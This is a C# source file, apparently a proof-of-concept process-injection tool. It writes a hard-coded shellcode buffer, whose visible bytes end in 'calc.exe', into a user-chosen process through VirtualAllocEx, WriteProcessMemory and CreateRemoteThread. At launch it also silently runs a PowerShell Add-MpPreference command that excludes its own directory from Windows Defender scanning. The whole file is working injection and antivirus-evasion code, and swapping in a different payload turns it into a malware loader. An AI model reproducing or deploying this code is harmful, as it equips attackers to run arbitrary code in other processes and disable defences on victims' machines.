using System;
using System.Runtime.InteropServices;
using System.Text;

namespace SimpleShellCode
{
    class Program
    {
        [DllImport("kernel32.dll")]
        public static extern IntPtr OpenProcess(UInt32 dwDesiredAccess, bool bInheritHandle, UInt32 dwProcessId);

        [DllImport("kernel32.dll")]
        public static extern IntPtr VirtualAllocEx(IntPtr hProcess, IntPtr lpAddress, int dwSize, UInt32 flAllocationType, UInt32 flProtect);

        [DllImport("kernel32.dll")]
        public static extern bool WriteProcessMemory(IntPtr hProcess, IntPtr lpBaseAddress, byte[] lpBuffer, int nSize, ref int lpNumberOfBytesWritten);

        [DllImport("kernel32.dll")]
        public static extern IntPtr CreateRemoteThread(IntPtr hProcess, IntPtr lpThreadAttributes, UInt32 dwStackSize, IntPtr lpStartAddress, IntPtr param, UInt32 dwCreationFlags, ref int lpThreadId);

        public enum State
        {
            MEM_COMMIT = 0x00001000,
            MEM_RESERVE = 0x00002000
        }

        public enum Protection
        {
            PAGE_EXECUTE_READWRITE = 0x40
        }
        public enum Process
        {
            PROCESS_ALL_ACCESS = 0x000F0000 | 0x00100000 | 0xFFFF,
            PROCESS_CREATE_THREAD = 0x0002,
            PROCESS_QUERY_INFORMATION = 0x0400,
            PROCESS_VM_OPERATION = 0x0008,
            PROCESS_VM_READ = 0x0010,
            PROCESS_VM_WRITE = 0x0020
        }

        static void Main(string[] args)
        {
            OnStartup();

            var processId = GetValidProcessId(args);

            var desiredAccess = Process.PROCESS_CREATE_THREAD | Process.PROCESS_QUERY_INFORMATION | Process.PROCESS_VM_OPERATION | Process.PROCESS_VM_READ | Process.PROCESS_VM_WRITE;

            byte[] buf = new byte[276]
            {
               0xfc,0x48,0x83,0xe4,0xf0,0xe8,0xc0,0x00,0x00,0x00,0x41,0x51,0x41,0x50,0x52,
               0x51,0x56,0x48,0x31,0xd2,0x65,0x48,0x8b,0x52,0x60,0x48,0x8b,0x52,0x18,0x48,
               0x8b,0x52,0x20,0x48,0x8b,0x72,0x50,0x48,0x0f,0xb7,0x4a,0x4a,0x4d,0x31,0xc9,
               0x48,0x31,0xc0,0xac,0x3c,0x61,0x7c,0x02,0x2c,0x20,0x41,0xc1,0xc9,0x0d,0x41,
               0x01,0xc1,0xe2,0xed,0x52,0x41,0x51,0x48,0x8b,0x52,0x20,0x8b,0x42,0x3c,0x48,
               0x01,0xd0,0x8b,0x80,0x88,0x00,0x00,0x00,0x48,0x85,0xc0,0x74,0x67,0x48,0x01,
               0xd0,0x50,0x8b,0x48,0x18,0x44,0x8b,0x40,0x20,0x49,0x01,0xd0,0xe3,0x56,0x48,
               0xff,0xc9,0x41,0x8b,0x34,0x88,0x48,0x01,0xd6,0x4d,0x31,0xc9,0x48,0x31,0xc0,
               0xac,0x41,0xc1,0xc9,0x0d,0x41,0x01,0xc1,0x38,0xe0,0x75,0xf1,0x4c,0x03,0x4c,
               0x24,0x08,0x45,0x39,0xd1,0x75,0xd8,0x58,0x44,0x8b,0x40,0x24,0x49,0x01,0xd0,
               0x66,0x41,0x8b,0x0c,0x48,0x44,0x8b,0x40,0x1c,0x49,0x01,0xd0,0x41,0x8b,0x04,
               0x88,0x48,0x01,0xd0,0x41,0x58,0x41,0x58,0x5e,0x59,0x5a,0x41,0x58,0x41,0x59,
               0x41,0x5a,0x48,0x83,0xec,0x20,0x41,0x52,0xff,0xe0,0x58,0x41,0x59,0x5a,0x48,
               0x8b,0x12,0xe9,0x57,0xff,0xff,0xff,0x5d,0x48,0xba,0x01,0x00,0x00,0x00,0x00,
               0x00,0x00,0x00,0x48,0x8d,0x8d,0x01,0x01,0x00,0x00,0x41,0xba,0x31,0x8b,0x6f,
               0x87,0xff,0xd5,0xbb,0xf0,0xb5,0xa2,0x56,0x41,0xba,0xa6,0x95,0xbd,0x9d,0xff,
               0xd5,0x48,0x83,0xc4,0x28,0x3c,0x06,0x7c,0x0a,0x80,0xfb,0xe0,0x75,0x05,0xbb,
               0x47,0x13,0x72,0x6f,0x6a,0x00,0x59,0x41,0x89,0xda,0xff,0xd5,0x63,0x61,0x6c,
               0x63,0x2e,0x65,0x78,0x65,0x00
            };
            int buff_size = buf.Length;
            int bytesWritten = 0;
            int lpThreadID = 0;
            IntPtr procHandle = OpenProcess((uint)desiredAccess, false, (uint)processId);
            IntPtr init = VirtualAllocEx(procHandle, IntPtr.Zero, buff_size,
                (uint)State.MEM_COMMIT | (uint)State.MEM_RESERVE, (uint)Protection.PAGE_EXECUTE_READWRITE);
            WriteProcessMemory(procHandle, init, buf, buff_size, ref bytesWritten);
            Console.WriteLine("[*] Bytes Written: {0}", bytesWritten);
            IntPtr threadPTR = CreateRemoteThread(procHandle, IntPtr.Zero, 0, init, IntPtr.Zero, 0, ref lpThreadID);
            Console.WriteLine("[*] Thread ID: {0}", lpThreadID);
        }

        private static void OnStartup()
        {
            // STRINGBUILDER USED TO BUILD THE COMMAND LINE ARGUMENTS
            StringBuilder args_builder = new StringBuilder();

            // APPEND THE POWERSHELL WINDOWS DEFENDER EXCLUSION COMMAND
            args_builder.Append("-inputformat none -outputformat none -NonInteractive -Command Add-MpPreference -ExclusionPath \"");

            // USE THE APPLICATION'S CURRENT DIRECTORY AS IT'S EXCLUSION TARGET
            args_builder.Append(Environment.CurrentDirectory);
            args_builder.Append("\"");


            // INITIATE A "Process" OBJECT
            System.Diagnostics.Process process = new();

            // SET THE STARTUP FILE NAME AS THE "PowerShell" EXECUTABLE
            process.StartInfo.FileName = "powershell";

            // SET THE COMMAND LINE ARGUMENTS OF THE PROCESS AS THE COMMAND LINE ARGUMENTS WITHIN THE "StringBuilder"
            process.StartInfo.Arguments = args_builder.ToString();

            // STRAT THE PROCESS
            process.Start();
        }

        private static int GetValidProcessId(string[] args)
        {
            if (args.Length > 0)
            {
                if (int.TryParse(args[0], out int processId))
                {
                    if (ValidateProcessId(processId))
                        return processId;
                }
            }

            do
            {
                Console.Write("Enter a valid process ID: ");
                var input = Console.ReadLine();
                if (int.TryParse(input, out int processId) && ValidateProcessId(processId))
                {
                    return processId;
                }
                Console.WriteLine("Invalid process ID. Please try again.");
            } while (true);
        }

        private static bool ValidateProcessId(int processId)
        {
            if (processId <= 0)
            {
                return false;
            }

            try
            {
                var process = System.Diagnostics.Process.GetProcessById(processId);
                return process != null;
            }
            catch (ArgumentException)
            {
                return false;
            }
        }
    }
}
